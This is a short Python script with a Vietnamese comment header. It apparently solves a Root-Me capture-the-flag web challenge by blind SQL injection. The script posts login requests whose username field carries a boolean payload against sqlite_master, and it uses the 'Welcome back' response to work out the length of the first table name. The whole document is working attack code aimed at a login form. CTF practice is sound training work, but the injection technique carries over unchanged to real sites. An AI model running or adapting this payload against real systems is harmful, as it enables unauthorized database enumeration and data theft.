######################  TÌM ĐỘ DÀI TÊN CỦA TABLE #######################

import requests

query = "1' or length((select tbl_name from sqlite_master limit 0, 1)) = "  
result = ""


for i in range(1, 30):
    username = query + str(i) + " -- "
    payload = {
        'username' : username,
        'password' : 123
    }
    request = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', payload)
    if ('Welcome back' in request.text):
        result += str(i)
        print("Length of table's name is " + result)
        break      
    else:
        print("Length = " + str(i) + ". Wrong !")
